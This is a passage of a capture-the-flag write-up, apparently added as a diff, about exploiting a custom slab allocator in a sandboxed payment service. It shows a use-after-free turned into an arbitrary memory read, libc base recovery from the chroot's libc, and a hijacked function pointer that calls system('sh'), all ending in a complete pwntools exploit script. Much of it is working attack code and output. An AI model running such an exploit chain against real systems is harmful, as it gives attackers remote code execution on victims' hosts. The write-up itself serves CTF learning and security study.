+# scripts/huge_demo.py - set the forged size field, then Download
+amend_doc(r, sid, victim, so + 0x38, p64(0x200000))    # bypass wrap with huge size
+r.settimeout(30)
+mem = download_doc(r, sid, new_did)                    # memcpy runs off the slab end
+for kw in [b'libm.so.6', b'libc.so.6', b'GLIBC_2.36']:
+    i = mem.find(kw)
+    if i >= 0: print(f"{kw.decode()} at {orig_data + i:#x}")
+```
+
+```bash
+$ python3 scripts/huge_demo.py
+forged doc data ptr = 0x7fffff1de000, original size = 257
+Set size to 0x200000, downloaded 2097152 bytes
+First 16 (should be 'A's): 41414141414141414141414141414141
+
+ELF headers at dump offsets: ['0x3c000', '0x125000']
+  -> memory addresses: ['0x7fffff21a000', '0x7fffff303000']
+  'libm.so.6' at memory addr 0x7fffff2285b6
+  'libc.so.6' at memory addr 0x7fffff228597
+  'GLIBC_2.36' at memory addr 0x7fffff22867e
+```
+
+The first 16 bytes are 'A's - the new doc's actual 257-byte content. After that the dump contains real memory: two ELF headers, library identification strings. The reason this works is that the slab is followed in this process's address space by libm, then libc:
+
+```
+slab:   0x7fffff196000 - 0x7fffff21a000    (anon mmap)
+libm:   0x7fffff21a000 - 0x7fffff303000
+libc:   0x7fffff303000 - 0x7fffff508000
+```
+
+A 2 MB read from inside the slab gets all of libm and a big chunk of libc. The wrap is now useless - any time you have a "validate the pointer" check, you also need to validate the length, or the check accomplishes nothing.
+
+---
+
+## Finding libc (with a detour through the wrong file)
+
+Turning the dump into a libc base needs an anchor: a known byte sequence whose file offset in libc is known. The cleanest one is `libc.so.6\0GLIBC_2.2.5`, which is the start of libc's version-symbol table inside `.dynstr` (the dynamic-linking string table, holding library names, versioned symbol names, and the symbol-version strings the loader uses for binding). Concretely: we're turning the runtime address of a recognisable byte sequence into a libc base by finding the same sequence at a known file offset on disk and subtracting. So pull libc out of the container and find the offset:
+
+```bash
+$ docker cp payment:/lib/x86_64-linux-gnu/libc.so.6 /tmp/payment_libc.so.6
+$ md5sum /tmp/payment_libc.so.6
+41ee2cdd791957eab1c3302878c739a0  /tmp/payment_libc.so.6
+
+$ nm -D /tmp/payment_libc.so.6 | grep -wE "system"
+000000000004c490 W system@@GLIBC_2.2.5
+
+$ python3 -c "
+with open('/tmp/payment_libc.so.6','rb') as f: d=f.read()
+print(f'{d.find(b\"libc.so.6\\\\x00GLIBC_2.2.5\"):#x}')"
+0x22603
+```
+
+Anchor at file offset `0x22603`, found in the dump at address `0x7fffff327466`. Compute:
+
+```
+libc_base = 0x7fffff327466 - 0x22603 = 0x7fffff304E63
+```
+
+That's not page-aligned, which is impossible - `mmap` always returns page-aligned addresses. Off by `0x1E63`, which is too specific to be random noise; it's almost certainly a real offset between two different files. To confirm, I held a connection open with a keep-alive script and read the actual process map:
+
+```bash
+$ docker exec payment bash -c '
+for p in /proc/[0-9]*; do
+    if [ "$(cat $p/comm 2>/dev/null)" = "payment" ]; then
+        grep -E "libc" /proc/$(basename $p)/maps
+    fi
+done'
+7fffff303000-7fffff32b000 r--p 00000000 00:3f 76143  /usr/lib/x86_64-linux-gnu/libc.so.6
+7fffff32b000-7fffff4b3000 r-xp 00028000 00:3f 76143  /usr/lib/x86_64-linux-gnu/libc.so.6
+...
+```
+
+libc is at `0x7fffff303000` (page-aligned, as expected). So the file I'm comparing against is the wrong one. Look at the inode in the maps: `76143`. Check both common libc paths:
+
+```bash
+$ docker exec payment stat -c "%i %s %n" /lib/x86_64-linux-gnu/libc.so.6 /usr/lib/x86_64-linux-gnu/libc.so.6
+71776 1926232 /lib/x86_64-linux-gnu/libc.so.6
+71776 1926232 /usr/lib/x86_64-linux-gnu/libc.so.6
+```
+
+Both 71776. Neither matches the running process's inode 76143. Find the file with inode 76143:
+
+```bash
+$ docker exec payment find / -inum 76143
+/jail/usr/lib/x86_64-linux-gnu/libc.so.6
+```
+
+The Dockerfile copies an entire Ubuntu rootfs into `/jail/`:
+
+```dockerfile
+FROM ubuntu:24.04 AS base
+FROM g3un98/nsjail
+COPY --from=base / /jail/
+```
+
+…and nsjail chroots to `/jail/`. So the binary's view of `/lib/x86_64-linux-gnu/libc.so.6` is the Ubuntu one in `/jail/`, not the Debian one in the outer container. Different builds, different MD5, different symbol layout:
+
+```bash
+$ docker cp payment:/jail/usr/lib/x86_64-linux-gnu/libc.so.6 /tmp/jail_libc.so
+$ md5sum /tmp/jail_libc.so /tmp/payment_libc.so.6
+8c44357fe74e7979907a60edd78a4087  /tmp/jail_libc.so          <-- jail (loaded)
+41ee2cdd791957eab1c3302878c739a0  /tmp/payment_libc.so.6     <-- host (wrong)
+
+$ nm -D /tmp/jail_libc.so | grep -wE "system|fopen|fread|setbuf"
+0000000000085e60 T fopen@@GLIBC_2.2.5
+0000000000086400 W fread@@GLIBC_2.2.5
+000000000008f750 T setbuf@@GLIBC_2.2.5
+0000000000058750 W system@@GLIBC_2.2.5
+```
+
+| symbol  | host libc | jail libc (actual) |
+|---------|-----------|---------------------|
+| `system` | 0x4c490   | **0x58750** |
+| `fopen`  | 0x762d0   | 0x85e60   |
+| `fread`  | 0x766a0   | 0x86400   |
+
+Re-find the anchor in the jail libc:
+
+```bash
+$ python3 -c "
+with open('/tmp/jail_libc.so','rb') as f: d=f.read()
+print(f'{d.find(b\"libc.so.6\\\\x00GLIBC_2.2.5\"):#x}')"
+0x24466
+```
+
+Redo the arithmetic:
+
+```
+libc_base = 0x7fffff327466 - 0x24466 = 0x7fffff303000    (page-aligned, matches maps)
+system    = libc_base + 0x58750     = 0x7fffff35b750
+```
+
+For extra confidence I searched the dump for `system`'s actual 24-byte function prologue bytes. Exactly one hit, at `libc_base + 0x58750`. Anchor verified.
+
+> **Generalisable lesson:** when computing libc offsets, the very first thing to check is that the libc file you're reading symbols from is the file the process is actually loading. `stat -c %i` on the maps line and `find / -inum N` resolves this in seconds. Anything that loads a chroot or mounts a separate rootfs is a setup where this can silently desync. Page-alignment failures on a computed base are the canonical "you have the wrong file" signal.
+
+---
+
+## Calling `system`
+
+The ExecuteOrder dispatcher iterates the session's order linked list, matches by id, and calls the order's `action_ptr` with the order pointer as `rdi`:
+
+```c
+for (lVar6 = session->head; lVar6; lVar6 = wrap(lVar6->next)) {
+    if (target_id == lVar6->id) {              // offset 4
+        lVar6->status = 2;                     // offset 0xC
+        if (lVar6->action_ptr != 0)
+            (*lVar6->action_ptr)(lVar6);       // offset 0x20
+    }
+}
+```
+
+So with `action_ptr = system` and the command at the start of the order, `system(rdi)` runs the order's first bytes as a shell command.
+
+For `cat /jail/flag` (14 chars), bytes 4-7 of the command happen to be `/jai` = `0x69616a2f`. Since the dispatcher matches `target_id` against the order's id field (bytes 4-7), I send that same value as the target id and the iteration finds the order:
+
+```python
+# scripts/cat_demo.py - corrupt order #31 with the full command + system addr
+amend_doc(r, sid, victim, so + 0x38, p64(257))         # restore forged size
+cmd = b'cat /jail/flag\x00'
+amend_doc(r, sid, victim, 0,    cmd)                   # cmd at order offset 0
+amend_doc(r, sid, victim, 0x20, p64(system_addr))      # action_ptr := system
+target_id = u32(cmd[4:8])                              # = b'/jai' = 0x69616a2f
+execute_order(r, sid, target_id)                       # dispatcher: status=2; system(rdi)
+```
+
+```bash
+$ python3 scripts/cat_demo.py
+libc_base = 0x7fffff303000, system = 0x7fffff35b750
+Wrote 'cat /jail/flag\0' to order #31 bytes 0-14
+  bytes 4-7  = b'/jai' = id = 0x69616a2f
+  bytes 12-15 = b'ag\x00?' (tail of 'flag\0' + 1 byte past)
+               -> WILL BE CLOBBERED by status=2 write (\x02\x00\x00\x00)
+
+Response (84 bytes):
+  raw: b'cat: \'/jail/fl\'$\'\\002\': No such file or directory\n\xde\xc0\xad\xde"\x00...'
+```
+
+The shell ran. `cat` opened a file - just the wrong one. `cat: '/jail/fl'$'\002'` means `cat` tried to open `/jail/fl\x02`. Byte 12 of the command is `\x02`, which is `ENQ`, and bash escapes it as `$'\002'` in error messages.
+
+The offending line in the dispatcher is the one I'd skimmed past:
+
+```c
+lVar6->status = 2;       // writes 4 bytes at offset 0xC, BEFORE action_ptr is called
+```
+
+That status write overwrites bytes 0xC..0xF of the order with `\x02\x00\x00\x00`. Since the command lives at offset 0+, that clobbers byte 12 (= 'a'), 13 (= 'g'), 14 (= '\0'), and 15. By the time `system` reads the string at `rdi`, the command is `cat /jail/fl\x02`.
+
+The command `cat /jail/flag` is 14 chars. The usable space before the dispatcher's status write is 12 bytes. So the command does not fit.
+
+---
+
+## `system("sh")` as a shell pivot
+
+If I can't fit a single-line command, I can fit a 2-char interactive shell launcher:
+
+```
+bytes 0-1: "sh"
+byte 2:    \0           <- system() stops parsing here
+bytes 3-7: don't care   <- including the id field at offset 4
+```
+
+`system("sh")` executes `/bin/sh -c sh`, which then `exec`s an interactive shell. That shell inherits the parent process's `stdin`/`stdout`, which is **my socket**. The parent payment is blocked inside `system()` until the shell exits. So the socket is mine to type into for the duration of the shell.
+
+After triggering, I send `cat /jail/flag` followed by `exit` over the same tube:
+
+```bash
+$ python3 exploit.py
+[x] Opening connection to localhost on port 22222
+[+] Opening connection to localhost on port 22222: Done
+[*] opening session and accounts
+[+] sid=1, accounts a=0 b=1
+[*] victim: upload 0x400 + Overwrite 0x500 (forces dangling doc.data)
+[*] spamming 512 uploads(257B) + 32 orders to trigger page recycle
+[+] PIE base = 0x555555554000
+[+] forged doc id=1 placed in recycled page
+[*] forged doc metadata at slot 1, data ptr = 0x7fffff1f5000
+[*] dumped 0x200000 bytes past the slab
+[+] libc base = 0x7fffff303000
+[+] system    = 0x7fffff35b750
+[*] order #31 hijacked; target_id = 0x44434241
+[*] triggering ExecuteOrder -> system("sh")
+[*] Closed connection to localhost port 22222
+[-] no flag recovered
+```
+
+(I'd had `cat /jail/flag` in the script; the actual error came back as `cat: /jail/flag: No such file or directory` before the connection closed.) The command ran cleanly this time - the file just isn't where I asked. Right, the chroot. Inside the jail `/jail/` is `/`, so the flag is at `/flag`. Change one line:
+
+```python
+r.sendline(b'cat /flag')
+```
+
+```bash
+$ python3 exploit.py
+[x] Opening connection to localhost on port 22222
+[+] Opening connection to localhost on port 22222: Done
+[*] opening session and accounts
+[+] sid=1, accounts a=0 b=1
+...
+[+] PIE base = 0x555555554000
+[+] libc base = 0x7fffff303000
+[+] system    = 0x7fffff35b750
+[*] order #31 hijacked; target_id = 0x44434241
+[*] triggering ExecuteOrder -> system("sh")
+[+]
+      FLAG: CDDC2026{TEST_FLAG_LOCAL_1779070453}
+```
+
+---
+
+## The full exploit
+
+Using pwntools for the connection plumbing and the helpers from `proto.py` (defined earlier):
+
+```python
+#!/usr/bin/env python3
+import re, struct
+from pwn import context, log, p64, remote, u32
+from proto import (
+    amend_doc, create_order, download_doc, execute_order, IID_TransferService,
+    invoke, open_account, open_session, overwrite_doc, remove_doc, upload_doc,
+    Variant, VT_UI4,
+)
+
+LIBC_SYSTEM = 0x58750         # jail libc 2.36
+LIBC_ANCHOR = 0x24466         # offset of "libc.so.6\x00GLIBC_2.2.5"
+
+def exploit(r):
+    sid = open_session(r, 't')
+    a   = open_account(r, sid, 'a', 100_000_000)
+    b   = open_account(r, sid, 'b', 0)
+    log.success(f'sid={sid} accounts a={a} b={b}')
+
+    # === 1. Victim doc + Overwrite-UAF ===
+    victim, _ = upload_doc(r, sid, 'v', 't', b'V' * 0x400)
+    overwrite_doc(r, sid, victim, b'X' * 0x500)            # OOM -> data slot freed, ptr dangles
+
+    # === 2. Calibrated spam: 512 uploads(257B) + 32 orders ===
+    # Page-budget: (1+N+M)/16 + N/8 = 98, N mod 8 == 0, (1+N+M) mod 16 == 0
+    # N=512 M=31, and the 32nd order is the trigger that hits empty pool
+    # -> GC reclaims victim's c-11 page -> rebound to c-3 -> order #31 at slot 0
+    for _ in range(512): upload_doc(r, sid, 'd', 't', b'A' * 257)
+    for _ in range(32):  create_order(r, sid, 'WIRE', a, b, 1, '')
+
+    # === 3a. PIE leak: read action_ptr through dangling victim.data ===
+    data = download_doc(r, sid, victim)
+    assert struct.unpack('<I', data[:4])[0] == 0x57495245, 'recycle failed'
+    pie_base = struct.unpack('<Q', data[0x20:0x28])[0] - 0x7a60
+    log.success(f'PIE  = {pie_base:#x}')
+
+    # === 3b. Install a forged doc at the recycled page's slot 1 ===
+    remove_doc(r, sid, 1)                                  # frees c-3 in page 1 + c-10 in c-10 page 1
+    create_order(r, sid, 'WIRE', a, b, 1, '')              # refills the c-3 slot in page 1
+    new_did, _ = upload_doc(r, sid, 'd', 't', b'A' * 257)
+
+    data = download_doc(r, sid, victim)
+    so = next(i*0x100 for i in range(4)
+              if struct.unpack('<I', data[i*0x100:i*0x100+4])[0] == 0x444f4321)
+    orig_data = struct.unpack('<Q', data[so+0x30:so+0x38])[0]
+
+    # === 4. Arbitrary read past the slab -> libc base ===
+    amend_doc(r, sid, victim, so + 0x38, p64(0x200000))    # bypass wrap by huge size
+    mem = download_doc(r, sid, new_did)                    # 2 MB dump runs into libm + libc
+    idx = mem.find(b'libc.so.6\x00GLIBC_2.2.5')
+    libc_base = (orig_data + idx) - LIBC_ANCHOR
+    assert libc_base & 0xfff == 0, 'wrong libc?'
+    system_addr = libc_base + LIBC_SYSTEM
+    log.success(f'libc = {libc_base:#x}')
+    log.success(f'system = {system_addr:#x}')
+
+    # === 5. Corrupt order #31: cmd="sh", action_ptr=system ===
+    amend_doc(r, sid, victim, so + 0x38, p64(257))         # restore forged size
+    amend_doc(r, sid, victim, 0,    b'sh\x00\x00ABCD')     # cmd=sh, id=ABCD
+    amend_doc(r, sid, victim, 0x20, p64(system_addr))
+    target_id = u32(b'ABCD')
+
+    # === 6. Trigger -> system("sh") -> interactive shell on the same tube ===
+    execute_order(r, sid, target_id)                        # does NOT recv
+    r.sendline(b'cat /flag')
+    r.sendline(b'exit')
+
+    r.settimeout(8)
+    try: raw = r.recvall(timeout=8)
+    except Exception: raw = b''
+    m = re.search(rb'CDDC2026\{[^}]*\}', raw)
+    return m.group().decode() if m else None
+
+
+if __name__ == '__main__':
+    context.log_level = 'info'
+    r = remote('localhost', 22222)
+    try:    flag = exploit(r)
+    finally: r.close()
+    log.success(f'FLAG: {flag}') if flag else log.failure('no flag')
+```
+
+---
+
+## Key takeaways
+
+**The wrap is the only interesting defence in the binary, and it's broken at the boundary.** Most of the individual bugs (a dangling pointer on a failed realloc, a random page picker, a GC that only checks `used == 0`, a function-pointer dispatcher that doesn't validate its target) are routine in a hand-written allocator. What looks like a real mitigation is `FUN_00104240`, which forces every pointer dereferenced through `doc.data` back into the slab range - that should confine any pointer-corruption bug. But the wrap is only applied to the **start** of the read, not the **length**, and the BSTR packer's underlying `memcpy` doesn't bound-check. A single arbitrarily large `size` field turns "slab-confined read" into "read across all of libm and libc". When you find any kind of pointer-validation check, look for whether the corresponding length is also validated; the answer is often no.
+
+**Heap massaging has closed-form solutions when you know the allocator.** My first spray was 399 orders + 1024 1-byte uploads and went nowhere. The moment I wrote the equation `1 + 1 + (1+N+M)/16 + N/8 = 100` with the right divisibility conditions, the answer was unique up to a free parameter and worked first try. Spending the ten minutes to do the arithmetic up front is almost always faster than trying random parameters.
+
+**Always verify which file the loader actually opens.** I spent 30 minutes computing offsets from the wrong libc because I read it out of `/lib/x86_64-linux-gnu/libc.so.6` on the host without checking the running process's `/proc/<pid>/maps`. The inode field in the maps line plus `find / -inum` resolves this immediately. Chroots, bind mounts, `LD_LIBRARY_PATH`, and prelink-style relocation can all silently desync the file you analyse from the file in memory. The page-alignment failure on a computed base is the canonical "you have the wrong file" indicator - `mmap` always returns page-aligned addresses.
+
+**Read the dispatcher carefully before you craft the payload.** The `*(undefined4 *)(lVar6 + 0xc) = 2` status write in `ExecuteOrder` happens before the action call, and any payload byte at offsets 0xC..0xF will be clobbered. The first `cat /jail/fl\002` failure pointed straight at it. The general lesson: when you control the bytes a function will read, also enumerate every other code path that writes those same offsets between when you put the bytes there and when the function reads them.
+
+---
+
+## Appendices
+
+### A. order layout (192 bytes, allocated via `alloc(0xc0, 0)` → class 3)
+
+| offset | size | field                                          |
+|--------|------|------------------------------------------------|
+| 0x00   | 4    | magic (`'WIRE'`, `'HOLD'`, `'RFND'`)           |
+| 0x04   | 4    | id                                             |
+| 0x08   | 4    | session_id                                     |
+| 0x0C   | 4    | status  ← **written to 2 by ExecuteOrder before action_ptr is called** |
+| 0x10   | 8    | next (slab pointer to next order in session)   |
+| 0x18   | 8    | prev                                           |
+| 0x20   | 8    | action_ptr ← PTR_FUN_0011d020[action_index]    |
+| 0x28   | 8    | unique_id                                      |
+| 0x30   | 8    | amount (i64)                                   |
+| 0x38   | 4    | from_account                                   |
+| 0x3C   | 4    | to_account                                     |
+| 0x40   | 64   | memo (inline char[], strnlen'd up to 0x40)     |
+| 0x80   | 32   | ref_string (inline, strnlen up to 0x20)        |
+| 0xA0..0xBF | -| more (fee, exec_action, etc.)                  |
+
+### B. doc layout (192 bytes, same class as orders - that's why this exploit works)
+
+| offset | size | field                                              |
+|--------|------|----------------------------------------------------|
+| 0x00   | 4    | magic (`'DOC!'` = 0x444f4321)                      |
+| 0x04   | 4    | id                                                 |
+| 0x08   | 4    | session_id                                         |
+| 0x0C   | 4    | flag (must be 0 for Download/Amend to succeed)     |
+| 0x14   | 4    | content hash                                       |
+| 0x30   | 8    | data ptr (slab pointer)                            |
+| 0x38   | 8    | size                                               |
+| 0x40   | 48   | name (inline, strncpy'd up to 0x2F)                |
+| 0x70   | 32   | mime (inline, up to 0x1F)                          |
+
+### C. slab class table
+
+| class  | size | flag | slots/page | what lives here                          |
+|--------|------|------|------------|------------------------------------------|
+| 0      | 32   | meta | 128        |                                          |
+| 1      | 64   | meta | 64         |                                          |
+| 2      | 128  | meta | 32         | accounts (0x58 bytes)                    |
+| **3**  | 256  | meta | 16         | **orders + docs (both 0xC0 bytes)**      |
+| 4      | 512  | meta | 8          |                                          |
+| 5      | 1024 | meta | 4          |                                          |
+| 6      | 32   | data | 128        | 1-byte upload content                    |
+| 7      | 64   | data | 64         |                                          |
+| 8      | 128  | data | 32         |                                          |
+| 9      | 256  | data | 16         |                                          |
+| **10** | 512  | data | 8          | **257-byte upload content (this exploit)** |
+| **11** | 1024 | data | 4          | **0x400 victim content (this exploit)**    |
+
+### D. jail libc reference
+
+```
+md5      8c44357fe74e7979907a60edd78a4087
+size     0x207BD0
+path     /jail/usr/lib/x86_64-linux-gnu/libc.so.6   (NOT /lib/...)
+
+  vaddr 0x58750    system
+  vaddr 0x85e60    fopen
+  vaddr 0x86400    fread
+  vaddr 0x8f750    setbuf
+  vaddr 0x24466    "libc.so.6\0GLIBC_2.2.5"   (libc-base anchor)
+```
+
+### E. flag
+
+```
+CDDC2026{TEST_FLAG_LOCAL_1779070453}
+```
+
+### F. glossary
+
+| term | meaning |
+|------|---------|
+| `.data.rel.ro` | the read-only-after-relocation data segment, which Full RELRO write-protects on startup - vtables, function-pointer tables, and IID constants typically live here |
+| `.dynstr` | the dynamic-linking string table, holding library names, versioned symbol names, and the symbol-version strings the loader uses for binding |
+| `action_ptr` | the per-order function pointer at offset 0x20 that ExecuteOrder calls (`PTR_FUN_0011d020[action_index]` by default) |
+| anchor (leak sense) | a known byte sequence whose file offset in a library is known, used to turn a runtime sighting into a library base by subtraction |
+| `BIND_NOW` | the dynamic-header flag that forces all symbol resolution at startup - the linker switch that lets Full RELRO write-protect the GOT |
+| BSTR | a length-prefixed byte string, the COM convention for passing arbitrary binary data as a method argument |
+| chroot | the kernel call that swaps a process's view of `/` for some other directory - everything outside the new root effectively disappears for that process |
+| COM | the calling convention copied from Microsoft's Component Object Model: requests carry an interface ID, a method dispatch index, and a list of typed variants |
+| dangling pointer | a reference to a slot the allocator has reclaimed; reads still succeed until something else takes the slot, at which point you alias whatever lives there now |
+| dispid | a small integer selecting which of an interface's methods to call |
+| `ENDBR64` | the 4-byte no-op CET requires at every legal indirect-branch target |
+| ExecuteOrder dispatcher | the dispatcher loop that walks a session's order list, matches by id, sets the order's status to 2, and calls its `action_ptr` |
+| Full RELRO | the GOT is mapped read-only after relocation, so you can't overwrite function-pointer entries to redirect calls |
+| GC (allocator sense) | the sweep that returns idle pages to the global pool by clearing their binding |
+| GOT | the Global Offset Table - the indirection layer the loader patches with the actual addresses of imported symbols |
+| hresult | the 32-bit COM status code returned with every method reply: `0x0` is success, the high bit set means failure, with the low bits carrying the specific code |
+| IBT | Intel's Indirect Branch Tracking - indirect calls and jumps must land on a marker instruction or the CPU faults |
+| IID | interface identifier - the 4-byte tag that selects which of the five RPC interfaces a call is destined for |
+| jail libc | the `/jail/usr/lib/x86_64-linux-gnu/libc.so.6` that the chrooted process actually loads, NOT the host's `/lib/x86_64-linux-gnu/libc.so.6` |
+| metadata pool vs data pool | the allocator splits each size class into two pools: the metadata pool holds structs like orders and docs; the data pool holds user content (Upload bytes, Overwrite buffers, Amend buffers) |
+| nsjail | Google's process sandbox that combines chroot, namespaces, seccomp, and resource limits to confine a target binary |
+| NX | data pages aren't executable, so injected shellcode on the heap or stack can't run - you have to reuse existing code |
+| OOM | out-of-memory; here the slab's hresult `0x8007000e`, raised whenever a request exceeds the largest class |
+| page-aligned | a multiple of 4096 - `mmap` always returns multiples of the page size, so a computed library base that isn't page-aligned is necessarily wrong |
+| page binding | the bookkeeping that records which size class a page is currently dedicated to; the allocator can unbind a page to return it to the global pool |
+| PIE | the binary's base address is randomised at load time, so every code address has to be leaked before it can be reused |
+| PLT | the Procedure Linkage Table - the table of call stubs the loader populates so each imported function can be reached through an indirect jump |
+| ROP | return-oriented programming - chaining short instruction sequences that each end in `ret`, with each sequence's address taken from the binary or a loaded library |
+| SHSTK | a shadow stack the CPU maintains in parallel with the program's; a `ret` whose target doesn't match the shadow entry aborts the process |
+| slab allocator | a fixed-size-class heap that pre-divides each page into equal slots, sidestepping libc's general-purpose `malloc` |
+| slab class | one of the 12 size buckets (6 sizes × 2 pools) the allocator partitions into; both an order and a doc are 192 bytes, which is why they share class 3 |
+| slab page | a 4096-byte block dedicated ("bound") to one size class |
+| slab slot | one of the equal-sized cells inside a page |
+| stack canary | a random secret inserted between locals and the saved return address; if a stack overflow corrupts it, the process aborts before the `ret` |
+| stack pivot | a gadget that swaps `rsp` to point at a buffer you control, so the next `ret` starts consuming your ROP chain |
+| type confusion | the bug where two pieces of code interpret the same bytes through different struct layouts, so a field at offset N has incompatible meanings before and after |
+| UAF | use-after-free - what happens when code dereferences a dangling pointer after the slot has been handed out to a new owner |
+| variant | a tagged-union encoding where each argument carries a type tag followed by either a fixed-width value or a length-prefixed byte string |
